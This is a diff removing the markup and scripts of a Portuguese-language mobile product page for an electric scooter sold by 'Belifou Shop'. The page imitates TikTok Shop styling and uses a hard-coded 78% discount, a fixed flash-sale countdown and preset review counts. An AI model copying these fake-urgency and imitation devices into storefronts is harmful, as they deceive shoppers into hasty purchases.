-        .dots-line .dot.dot-red {
-            left: 0;
-            background: #fe2d55;
-            animation: slide-right .9s ease-in-out infinite;
-        }
-
-        .dots-line .dot.dot-cyan {
-            right: 0;
-            background: #00f2ea;
-            animation: slide-left .9s ease-in-out infinite;
-        }
-
-        @keyframes slide-right {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-
-        @keyframes slide-left {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(-10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-    </style>
-    <style>
-        .mais-desta-loja-carousel {
-            display: flex;
-            gap: 0.7rem;
-            overflow-x: auto;
-            padding-bottom: 0.3rem;
-            scrollbar-width: none;
-            -ms-overflow-style: none;
-        }
-
-        .mais-desta-loja-carousel::-webkit-scrollbar {
-            display: none;
-        }
-
-        .mais-desta-loja-card {
-            width: 120px;
-            min-width: 120px;
-            max-width: 120px;
-            min-height: 160px;
-            height: 160px;
-            background: #fff;
-            border-radius: 0.8rem;
-            box-shadow: 0 2px 8px #0001;
-            padding: 0.5rem;
-            flex-shrink: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            transition: box-shadow 0.2s, transform 0.2s;
-            cursor: pointer;
-        }
-
-        .mais-desta-loja-card:hover {
-            box-shadow: 0 6px 18px #ff2d5522, 0 2px 8px #0002;
-            transform: translateY(-2px) scale(1.025);
-        }
-
-        .mais-desta-loja-card img {
-            border-radius: 0.6rem;
-            margin-bottom: 0.3rem;
-            width: 100%;
-            height: 70px;
-            object-fit: cover;
-            background: #f7f7f7;
-        }
-
-        .mais-desta-loja-card p {
-            margin: 0;
-            font-size: 13px;
-            text-align: center;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-
-        .mais-desta-loja-card .preco {
-            color: #ff2d55;
-            font-weight: bold;
-            font-size: 0.98rem;
-        }
-
-        .mais-desta-loja-card .desconto {
-            color: #aaa;
-            font-size: 0.8rem;
-        }
-
-        .mais-desta-loja-section {
-            max-width: 520px;
-            margin: 0 auto;
-            padding: 12px 0 8px 0;
-        }
-    </style>
-    <!-- TikTok Pixel Code Start (REMOVIDO: código corrompido) -->
-    <!-- TikTok Pixel Code End -->
-    <script type="text/javascript">
-        (function (c, l, a, r, i, t, y) {
-            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-        })(window, document, "clarity", "script", "t9udqznhez");
-    </script>
-
-    <!-- Tailwind -->
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
-    <title>Shop</title>
-    <link href="/landings/modelo/stylesss.css" rel="stylesheet">
-    <style>
-        /* Deixa o CTA do modal flutuando (sticky) como no index + compat iOS */
-        #buy-positions {
-            position: -webkit-sticky;
-            /* iOS Safari */
-            position: sticky;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 30;
-            background: #ffffff;
-            /* sólido para não vazar o fundo */
-            box-shadow: 0 -2px 12px #0001;
-            padding-top: 18px;
-            padding-right: 16px;
-            padding-left: 16px;
-            padding-bottom: 12px;
-            /* fallback */
-            padding-bottom: calc(12px + env(safe-area-inset-bottom));
-            /* iOS safe area */
-            margin-top: 0;
-            border-radius: 0 !important;
-            text-transform: uppercase;
-        }
-
-        /* Toast minimal para feedback central (compatível com o index) */
-        .toast-center {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) scale(.98);
-            min-width: 240px;
-            max-width: 90vw;
-            background: #3a3a3a;
-            color: #fff;
-            padding: 16px 20px;
-            border-radius: 14px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, .08);
-            z-index: 9999;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            opacity: 0;
-            transition: opacity .25s ease, transform .25s ease;
-            pointer-events: none;
-        }
-
-        .toast-center.show {
-            opacity: 1;
-            transform: translate(-50%, -50%) scale(1);
-        }
-
-        .toast-icon {
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: inline-grid;
-            place-items: center;
-        }
-
-        .toast-icon.success {
-            background: #2ecc71;
-        }
-
-        .toast-icon.error {
-            background: #e74c3c;
-        }
-
-        .toast-icon.info {
-            background: #3498db;
-        }
-
-        .toast-text {
-            font-weight: 600;
-        }
-
-        .toast-icon svg {
-            width: 14px;
-            height: 14px;
-            stroke: #fff;
-        }
-
-        /* Loader de bolinhas deslizantes (vermelho e ciano) */
-        .dots-line {
-            position: relative;
-            width: 28px;
-            height: 10px;
-        }
-
-        .dots-line .dot {
-            position: absolute;
-            top: 1px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            opacity: .95;
-        }
-
-        .dots-line .dot.dot-red {
-            left: 0;
-            background: #fe2d55;
-            animation: slide-right .9s ease-in-out infinite;
-        }
-
-        .dots-line .dot.dot-cyan {
-            right: 0;
-            background: #00f2ea;
-            animation: slide-left .9s ease-in-out infinite;
-        }
-
-        @keyframes slide-right {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-
-        @keyframes slide-left {
-            0% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-
-            50% {
-                transform: translate3d(-10px, 0, 0);
-                opacity: 1;
-            }
-
-            100% {
-                transform: translate3d(0, 0, 0);
-                opacity: .65;
-            }
-        }
-    </style>
-</head>
-
-<body>
-    <style>
-        /* Transição suave no carrossel principal de fotos */
-        .image-container { position: relative; overflow: hidden; }
-        .product-main-image {
-            transition: opacity .35s ease;
-            opacity: 0; /* começa transparente para dar fade-in no primeiro load */
-            will-change: opacity;
-        }
-    </style>
-    <div class="container">
-        <!-- Header -->
-        <header id="main-header" class="header">
-            <div class="header-left"></div>
-            <a href="index.php" aria-label="Voltar para a página inicial" style="display: inline-flex; align-items: center;">
-                <img src="images/simbolo-da-linha-de-seta-para-a-esquerda.png" alt="Voltar" width="20" height="20" style="display:block;">
-            </a>
-            <div class="flex-1">
-            </div>
-
-
-
-            <div class="header-right" style="font-size: 21px; margin-left: 21px;">
-                <button onclick="handleOpenShareSection()">
-                    <img src="images/compartilhar.png" alt="Compartilhar" width="20" height="20">
-                </button>
-                <a href="cart.html" style="position: relative; text-decoration: none; color: inherit; display: inline-flex; align-items: center;">
-                    <img src="images/carrinho-de-compras.png" alt="Compartilhar" width="20" height="20">
-
-                    <span id="cart-count-header" style="
-            position: absolute;
-            top: -5px;
-            right: -5px;
-            background: #ff2d55;
-            color: white;
-            border-radius: 50%;
-            width: 16px;
-            height: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-        ">0</span>
-                </a>
-                <button onclick="handleOpenComplaintSection()" style="display: inline-flex; align-items: center; padding: 0;">
-                    <img src="images/linha.png" alt="Denunciar" width="20" height="20" style="display:block;">
-                </button>
-            </div>
-        </header>
-        <!-- Product Images -->
-        <section id="visao-geral-section" class="product-images">
-            <div class="image-container">
-                <img alt="Imagem do Produto" class="product-main-image" id="main-product-image" src="" style="display:none;">
-                <div class="image-loading" id="image-loading">Carregando...</div>
-                <div class="image-counter" id="image-counter">1/1</div>
-                <button class="swipe-indicator left" id="img-prev-btn" style="background:none;border:none;font-size:22px;position:absolute;left:8px;top:50%;transform:translateY(-50%);z-index:2;">←</button>
-                <button class="swipe-indicator right" id="img-next-btn" style="background:none;border:none;font-size:22px;position:absolute;right:8px;top:50%;transform:translateY(-50%);z-index:2;">→</button>
-            </div>
-            <div class="image-dots" id="image-dots"></div>
-            <div class="image-thumbnails" id="image-thumbnails"></div>
-        </section>
-        <!-- Price Section -->
-        <!-- New Clean Price Section (restaurado padrão) -->
-        <section class="clean-price-section" style="
-            padding: 8px 16px 6px 16px;
-            background: #fff url('images/banner-promocao.jpg') center center/cover no-repeat;
-            background-size: cover;
-            min-height: 36px;
-            box-shadow: 0 2px 12px #0001;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        ">
-            <div style="display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 0;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <div style="display: flex; flex-direction: column; align-items: flex-start; gap: 0;">
-                        <div style="display: flex; flex-direction: row; align-items: center; gap: 8px;">
-                            <span id="discount-percent" style="background: #ffffff; color: #ff2d55; padding: 2px 6px; border-radius: 4px; font-size: 12px; font-weight: 600;">-78%</span>
-                            <span id="price-current" style="font-family: 'TikTokDisplayFont', sans-serif; font-size: 19px; font-weight: 700; color: #ffffff; margin-left:8px;">R$
-                                67,90
-                            </span>
-                            <img src="images/bilhete.png" alt="Bilhete" style="margin-left:4px; vertical-align:middle; width:20px; height:20px; display:inline-block; filter: brightness(100) invert(1) drop-shadow(0 0 1px #ffffff);">
-                        </div>
-                        <span id="price-compare" style="text-decoration: line-through; color: #d1d1d1; font-size: 14px; display: block; margin-left:0; margin-top:2px;">R$
-                            619,90</span>
-                    </div>
-                </div>
-                <div style="display: flex; flex-direction: column; align-items: flex-end;">
-                    <div style="display: flex; align-items: center; background: #fff8f800; padding: 3px 8px; border-radius: 12px;">
-                        <img src="images/raio.png" alt="Oferta Relâmpago" style="width:14px; height:14px; display:inline-block; vertical-align:middle; margin-right:2px; filter: brightness(100) invert(1) drop-shadow(0 0 1px #fff);">
-                        <span style="color: #ffffff; font-size: 12px; font-weight: 600; margin-left: 4px;">Oferta
-                            Relâmpago</span>
-                    </div>
-                    <div style="margin-top: 2px; display: flex; align-items: center;">
-                        <span id="countdown-timer" style="color: #ffffffd8; font-size: 14px; font-weight: 600;">Termina
-                            em 01:11</span>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section class="coupon-bar" style="background: #fff; padding: 4px 10px; border-radius: 8px; margin: 8px 0 0 0; box-shadow: none; border: none;">
-            <div class="coupon-content" style="display: flex; align-items: center; gap: 10px; width: 100%; justify-content: flex-start; padding: 0; overflow: hidden; white-space: nowrap; text-overflow: ellipsis;">
-                <img src="images/bilhete.png" alt="Bilhete" style="width:16px; height:16px; margin-right:2px; filter: brightness(0) saturate(100%) invert(32%) sepia(99%) saturate(7492%) hue-rotate(329deg) brightness(99%) contrast(101%); flex-shrink:0;">
-                <span style="background: #ffe4ee; border-radius: 3px; padding: 4px 14px; font-size: 13px; color: #ff2d55; margin-left: 6px; flex-shrink:0; font-weight: 700; line-height: 1; display: inline-flex; align-items: center;">Desconto
-                    de 15%, máximo de R$35</span>
-                <span style="background: #ffe4ee; border-radius: 3px; padding: 4px 14px; font-size: 13px; color: #ff2d55; margin-left: 6px; flex-shrink:0; font-weight: 700; line-height: 1; display: inline-flex; align-items: center;">Cupom
-                    válido para compras acima de R$100</span>
-                <span style="background: #ffe4ee; border-radius: 3px; padding: 4px 14px; font-size: 13px; color: #ff2d55; margin-left: 6px; flex-shrink:0; font-weight: 700; line-height: 1; display: inline-flex; align-items: center;">Economize
-                    6% com
-                    <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="#ff2d55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24" style="margin-left:4px;">
-                        <path d="M9 6l6 6-6 6"></path>
-                    </svg>
-                </span>
-                <span style="background: #ffe4ee; border-radius: 3px; padding: 4px 14px; font-size: 13px; color: #ff2d55; margin-left: 6px; flex-shrink:0; font-weight: 700; line-height: 1; display: inline-flex; align-items: center;">Aplicável
-                    em produtos selecionados</span>
-                <span style="flex-shrink:1; color: #ff2d55; font-size: 18px; font-weight: bold; margin-left: 8px;">...</span>
-            </div>
-        </section>
-
-
-        <section class="product-info" style="padding: 4px 16px 2px 16px;">
-            <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 12px;">
-                <h1 id="product-title" class="product-title" style="flex: 1; font-size: 16px; margin: 0; line-height: 1.2;">Patinete
-                    Elétrico Scooter De Alumínio Com Bluetooth 30km/h</h1>
-                <button id="save-button" style="background: none; border: none; cursor: pointer; padding: 4px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: all 0.2s ease;" onclick="toggleSave()">
-                    <span class="save-btn-wrap" id="save-btn-wrap" style="pointer-events:auto;">
-                        <img id="save-icon" src="images/salvar.png" alt="Salvar" width="24" height="24" style="display:inline-block; vertical-align:middle; pointer-events:none;">
-                    </span>
-                </button>
-            </div>
-            <div class="rating-section" style="margin-top: 2px;">
-                <span class="stars">
-                    <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107" style="width: 18px; height: 18px;">
-                        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z">
-                        </path>
-                    </svg>
-                </span>
-                <span id="rating-text" class="rating-text" style="font-size: 12px; color: #888;">4.7 (<span style="color:#2196f3;font-weight:700;">204</span>) 4473
-                    <span id="rating-text" class="rating-text" style="font-size: 12px; color: #888;">4.7 (<span style="color:#2196f3;font-weight:700;">204</span>) 4473 vendidos</span>
-                    <script>
-                        // Deixa o número (204) azul na avaliação
-                        document.addEventListener('DOMContentLoaded', function () {
-                            var ratingText = document.getElementById('rating-text');
-                            if (ratingText) {
-                                ratingText.innerHTML = ratingText.innerHTML.replace(/\((\d+)\)/, '(<span style="color:#2196f3;font-weight:700;">$1</span>)');
-                            }
-                        });
-                    </script>
-            </span></div>
-        </section>
-        <!-- Shipping Info -->
-        <section class="shipping-info" style="padding: 8px 0;">
-            <div class="shipping-row" style="padding: 8px 16px;">
-                <div style="display: flex; flex-direction: column; align-items: flex-start; gap: 0; width: 100%;">
-                    <div style="display: flex; align-items: center; gap: 6px; width: 100%;">
-                        <img class="shipping-icon" src="images/entrega.png" alt="Entrega" width="16" height="16" style="display:inline-block; transform: scale(0.95); margin-right:2px; vertical-align:middle;">
-                        <span style="background: #e0f7fa; color: #00bfae; font-size: 11px; font-weight: 600; border-radius: 5px; padding: 0px 6px; display: inline-block; vertical-align:middle;">frete
-                            grátis</span>
-                        <span id="shipping-date" style="color: #000; font-size: 12px; margin-bottom: 0; margin-left: 4px; vertical-align:middle;">Receba
-                            até 10–15 de set</span>
-                    </div>
-                    <div class="shipping-fee" style="color: #999; font-size: 11px; text-decoration: line-through; margin-left: 22px; margin-top: 1px;">
-                        Taxa de envio: R$ 20,90</div>
-                </div>
-                <span style="color: #000;"></span>
-            </div>
-
-            <div style="height: 1px; background-color: #f0f0f0; margin: 4px 0; width: 100%;"></div>
-
-            <div class="shipping-row" style="padding: 8px 16px;">
-                <img class="shipping-icon" src="images/escudo.png" alt="Garantia/Devoluções" width="16" height="16" style="display:block; transform: scale(0.85);">
-                <div class="shipping-details">
-                    <div style="color: #000; font-size: 12px; line-height: 1.2;">Devoluções gratuitas em 30 dias •
-                        Cancelamento fácil</div>
-                </div>
-                <span style="color: #000;"></span>
-            </div>
-
-            <!-- Bloco de opções de variações estilo TikTok -->
-            <div id="variacoes-preview-row" style="display: flex; align-items: center; gap: 12px; padding: 12px 16px 8px 16px; cursor:pointer;" onclick="abrirModalVitrineVaria()">
-                <img src="images/grid.png" alt="Opções" width="15" height="15" style="margin-right: 8px; opacity:0.7;">
-                <div id="variacoes-thumbs" style="display: flex; gap: 6px;"></div>
-                <span id="variacoes-qtd" style="color: #888; font-size: 17px; margin-left: 12px; font-weight: 400;"></span>
-                <svg style="margin-left: auto; opacity:0.6;" width="22" height="22" fill="none" stroke="#888" stroke-width="2" viewBox="0 0 24 24">
-                    <path d="M9 6l6 6-6 6"></path>
-                </svg>
-            </div>
-            <script>
-                // Renderiza miniaturas das variações (ex: cores)
-                function renderVariacoesPreview(produto) {
-                    const thumbs = document.getElementById('variacoes-thumbs');
-                    const qtd = document.getElementById('variacoes-qtd');
-                    if (!produto || !produto.variacoes || produto.variacoes.length === 0) {
-                        document.getElementById('variacoes-preview-row').style.display = 'none';
-                        return;
-                    }
-                    document.getElementById('variacoes-preview-row').style.display = 'flex';
-                    thumbs.innerHTML = '';
-                    // Mostra até 4 miniaturas
-                    produto.variacoes.slice(0, 4).forEach(v => {
-                        if (v.imagem) {
-                            const img = document.createElement('img');
-                            img.src = v.imagem;
-                            img.alt = v.titulo || '';
-                            img.style.width = '38px';
-                            img.style.height = '38px';
-                            img.style.objectFit = 'cover';
-                            img.style.borderRadius = '8px';
-                            img.style.background = '#fafafa';
-                            thumbs.appendChild(img);
-                        }
-                    });
-                    qtd.textContent = produto.variacoes.length + ' opções disponíveis';
-                }
-                // Função para abrir o mesmo modal de variações
-                function abrirModalVitrineVaria() {
-                    if (typeof abrirModalProduto === 'function' && window.produtoAtual) {
-                        abrirModalProduto(window.produtoAtual);
-                    } else if (typeof abrirModal === 'function') {
-                        abrirModal();
-                    }
-                }
-                // Chamar ao carregar produto
-                document.addEventListener('DOMContentLoaded', function () {
-                    // produtoAtual é usado no sistema, se não, tente window.produto
-                    setTimeout(function () {
-                        var prod = window.produtoAtual || window.produto;
-                        if (prod) renderVariacoesPreview(prod);
-                    }, 400);
-                });
-            </script>
-
-            <div style="height: 1px; background-color: #f0f0f0; margin: 4px 0; width: 100%;"></div>
-        </section>
-
-        <section class="protecao-cliente">
-            <div class="protecao-header">
-                <div class="header-left" style="position:relative;display:flex;align-items:center;gap:5px;">
-                    <span class="escudo-gold-wrapper" style="position:relative;display:inline-block;width:16px;height:16px;margin-right:2px;vertical-align:middle;">
-                        <img src="images/escudo%202.png" alt="Proteção" width="16" height="16" style="display:block;vertical-align:middle;opacity:0.45;">
-                        <span style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;mix-blend-mode:color;opacity:0.85;background:linear-gradient(120deg,#ffd700 80%,#fffbe6 100%);"></span>
-                    </span>
-                    <span>Proteção do cliente</span>
-                </div>
-                <div class="header-right">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="none" stroke="#8c6c00" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
-                        <path d="M9 6l6 6-6 6"></path>
-                    </svg>
-                </div>
-            </div>
-
-            <ul class="protecao-lista">
-                <li style="color:#000;"><span class="check" style="position:relative;display:inline-block;width:9px;height:9px;margin-right:5px;vertical-align:middle;">
-                        <img src="images/marca-de-verificacao-contorno-preto.png" alt="ok" style="width:9px;height:9px;display:block;">
-                        <span style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;mix-blend-mode:color;opacity:0.45;background:linear-gradient(135deg,#ffe066 60%,#fffbe6 100%);"></span>
-                    </span>Devolução gratuita</li>
-                <li style="color:#000;"><span class="check" style="position:relative;display:inline-block;width:9px;height:9px;margin-right:5px;vertical-align:middle;">
-                        <img src="images/marca-de-verificacao-contorno-preto.png" alt="ok" style="width:9px;height:9px;display:block;">
-                        <span style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;mix-blend-mode:color;opacity:0.45;background:linear-gradient(135deg,#ffe066 60%,#fffbe6 100%);"></span>
-                    </span>Reembolso automático por danos</li>
-                <li style="color:#000;"><span class="check" style="position:relative;display:inline-block;width:9px;height:9px;margin-right:5px;vertical-align:middle;">
-                        <img src="images/marca-de-verificacao-contorno-preto.png" alt="ok" style="width:9px;height:9px;display:block;">
-                        <span style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;mix-blend-mode:color;opacity:0.45;background:linear-gradient(135deg,#ffe066 60%,#fffbe6 100%);"></span>
-                    </span>Pagamento seguro</li>
-                <li style="color:#000;"><span class="check" style="position:relative;display:inline-block;width:9px;height:9px;margin-right:5px;vertical-align:middle;">
-                        <img src="images/marca-de-verificacao-contorno-preto.png" alt="ok" style="width:9px;height:9px;display:block;">
-                        <span style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;mix-blend-mode:color;opacity:0.45;background:linear-gradient(135deg,#ffe066 60%,#fffbe6 100%);"></span>
-                    </span>Cupom por atraso na coleta</li>
-            </ul>
-        </section>
-
-
-        <!-- Tabs -->
-        <div id="sticky-tabs" class="tabs" style="display: none; position: sticky; top: 40px; z-index: 99; background: white; border-bottom: 1px solid #f0f0f0;">
-            <div class="tab active" onclick="scrollToVisaoGeral()">Visão geral</div>
-            <div class="tab" onclick="scrollToAvaliacoes()">Avaliações</div>
-            <div class="tab" onclick="scrollToDescription()">Descrição</div>
-            <div class="tab" onclick="scrollToRecomendacoes()">Recomendações</div>
-        </div>
-        <!-- Tab Content -->
-        <div class="content-section active" id="overview">
-            <!-- Options -->
-
-            <!-- Reviews Section -->
-            <section id="avaliacoes-section" class="reviews-section" style="padding-top: 10px; padding-bottom: 0;">
-                <div class="reviews-header" style="margin-bottom: 2px;">
-                    <span class="reviews-title" id="reviews-count">Avaliações dos clientes (207)</span>
-                </div>
-                <div class="reviews-rating">
-                    <span class="rating-big" style="font-size: 18px;">4.7</span>
-                    <span style="font-size: 14px; color: #999;">/5</span>
-                    <span class="stars">
-                        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107">
-                            <path d="M12 2l3.09 6.26L24 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
-                        </svg>
-                        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107">
-                            <path d="M12 2l3.09 6.26L24 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
-                        </svg>
-                        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107">
-                            <path d="M12 2l3.09 6.26L24 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
-                        </svg>
-                        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107">
-                            <path d="M12 2l3.09 6.26L24 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
-                        </svg>
-                        <svg class="star-icon" viewBox="0 0 24 24" fill="#ffc107">
-                            <path d="M12 2l3.09 6.26L24 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
-                        </svg>
-                    </span>
-                </div>
-                <!-- Novos depoimentos mais recentes aparecem primeiro -->
-                <div id="dynamic-reviews"></div>
-
-                <!-- Bottom Navigation -->
-                <nav class="bottom-nav">
-                    <a class="nav-item" href="index.php">
-                        <svg class="nav-icon" fill="none" height="20" viewBox="0 0 24 24" width="20">
-                            <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
-                            </path>
-                            <path d="M9 22V12H15V22" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
-                        </svg>
-                        <span>Loja</span>
-                    </a>
-                    <a class="nav-item" href="#">
-                        <svg class="nav-icon" fill="none" height="20" viewBox="0 0 24 24" width="20">
-                            <path d="M21 15C21 15.5304 20.7893 16.0391 20.4142 16.4142C20.0391 16.7893 19.5304 17 19 17H7L3 21V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H19C19.5304 3 20.0391 3.21071 20.4142 3.58579C20.7893 3.96086 21 4.46957 21 5V15Z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2">
-                            </path>
-                        </svg>
-                        <span>Chat</span>
-                    </a>
-                    <button class="add-cart-btn" id="add-to-cart-btn" type="button" autocomplete="off" form="" tabindex="0">Adicionar ao Carrinho</button>
-                    <a class="buy-btn" href="javascript:void(0);" role="button" style="display: flex; align-items: center; justify-content: center; text-decoration: none; color: white;" id="buy-now-btn" type="button">Comprar Agora</a>
-                </nav>
-
-                <!-- Modal de seleção (novo padrão clonado do index.php) -->
-                <div id="meuModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-end justify-center z-[9999] hidden" style="z-index:9999;">
-                    <div class="bg-white p-4 rounded-t-lg w-full max-w-lg relative" style="position:fixed; bottom:0; left:0; right:0; overflow-y: auto; -webkit-overflow-scrolling: touch; max-height: 85vh; box-shadow: 0 4px 16px rgba(0,0,0,0.08); border-bottom-left-radius:0!important; border-bottom-right-radius:0!important; margin:0 auto; max-width:480px; padding-bottom:0;">
-                        <button onclick="fecharModal()" class="absolute top-2 right-2 text-gray-500 hover:text-red-600 text-xl font-bold" aria-label="Fechar">×</button>
-                        <div id="modal-loader" class="w-full flex items-center justify-center py-14">
-                            <div class="dots-line" aria-label="Carregando">
-                                <span class="dot dot-red"></span>
-                                <span class="dot dot-cyan"></span>
-                            </div>
-                        </div>
-                        <div id="modal-conteudo" class="hidden">
-                            <div class="flex flex-row items-start gap-3 w-full">
-                                <img src="" alt="Produto" id="img-solts" style="width:70px; height:70px; max-width:70px; max-height:70px; min-width:60px; min-height:60px; object-fit:contain; background:transparent; border-radius:0.7rem; box-shadow:0 1px 6px #0001; display:block; margin-top:0; margin-left:0;" loading="lazy">
-                                <div class="flex-1 flex flex-col justify-start items-start pl-1 pt-0">
-                                    <div class="flex items-center mb-1">
-                                        <span id="div_ors_5" class="bg-rose-500 text-white text-xs font-bold px-2 py-0.5 rounded mr-2" style="min-width:44px; text-align:center;"></span>
-                                        <span id="div_ors_3" class="text-2xl font-extrabold text-rose-600 leading-tight"></span>
-                                    </div>
-                                    <div class="flex items-center mb-1">
-                                        <span id="div_ors_1" class="text-base font-semibold text-gray-800 mr-2"></span>
-                                    </div>
-                                    <div class="flex items-center">
-                                        <span id="div_ors_2" class="text-gray-400 text-base line-through"></span>
-                                    </div>
-                                </div>
-                            </div>
-                            <!-- Frete grátis pode ser adicionado abaixo se necessário -->
-                            <!-- <span class="inline-block bg-green-100 text-green-600 text-xs font-semibold px-2 py-0.5 rounded mt-1 ml-1">Frete grátis</span> -->
-
-                            <div class="chatsw mt-4">
-                                <h3 class="text-lg font-bold mb-2" id="titulo-variacoes"></h3>
-                                <div id="grid-variacoes" class="grid grid-cols-1 gap-3">Cores</div>
-                            </div>
-
-                            <div class="w-full mt-2" id="buy-positions"></div>
-                        </div>
-                    </div>
-                </div>
-        </section></div>
-
-        <section class="reviews-card" aria-label="Avaliações da loja">
-
-            <div class="reviews-header">
-                <div>
-                    <div class="title">Avaliações da loja <span style="color:var(--muted);font-weight:600">(13,9
-                            mil)</span></div>
-                    <div class="subtitle">Resumo e classificação dos clientes</div>
-                </div>
-
-                <div class="chev" aria-hidden="true">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                    </svg>
-                </div>
-            </div>
-
-            <div class="pills" role="list">
-
-                <div class="pill media-pill" role="listitem" tabindex="0" title="Inclui imagens ou vídeos (2,5 mil)">
-                    <svg viewBox="0 0 24 24" fill="none" aria-hidden="true" focusable="false">
-                        <path d="M4 7h.01M20 7h.01M3 7a1 1 0 011-1h16a1 1 0 011 1v10a1 1 0 01-1 1H4a1 1 0 01-1-1V7z" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"></path>
-                        <circle cx="8.5" cy="11.5" r="2" stroke="currentColor" stroke-width="1.2"></circle>
-                    </svg>
-                    <small>Inclui imagens ou vídeos</small>
-                    <span style="color:var(--muted);font-weight:700">(2,5 mil)</span>
-                </div>
-
-                <div class="pill star-pill" role="listitem" tabindex="0" title="5 estrelas">
-                    <span class="badge">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                            <path d="M12 .587l3.668 7.431L24 9.748l-6 5.857L19.335 24 12 20.201 4.665 24 6 15.605 0 9.748l8.332-1.73L12 .587z" fill="var(--accent)"></path>
-                        </svg>
-                        5
-                    </span>
-                    <span class="count">(12,3 mil)</span>
-                </div>
-
-                <div class="pill star-pill" role="listitem" tabindex="0" title="4 estrelas">
-                    <span class="badge">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-                            <path d="M12 .587l3.668 7.431L24 9.748l-6 5.857L19.335 24 12 20.201 4.665 24 6 15.605 0 9.748l8.332-1.73L12 .587z" fill="var(--accent)"></path>
-                        </svg>
-                        4
-                    </span>
-                    <span class="count">(857)</span>
-                </div>
-
-            </div>
-
-        </section>
-
-        <!-- Store Info Section -->
-        <div class="flex items-center justify-between border p-4 rounded w-full max-w-md mx-auto mt-10 bg-white" style="margin-top: 0; border: solid 10px #dddddd75; border-radius: 0px; border-left: 0px; border-right: 0px;">
-            <div class="flex items-center">
-                <img id="store-logo" data-default-logo="images/belilogo.png" onclick="openFullscreen(document.getElementById('store-logo').src)" class="w-12 h-12 rounded-full border" alt="Logo" src="" loading="lazy">
-                <div class="ml-3">
-                    <div class="flex items-center gap-2">
-                        <p id="store-nome" class="font-semibold text-gray-800" style="color: #000; font-weight: 500; margin:0;">Belifou Shop</p>
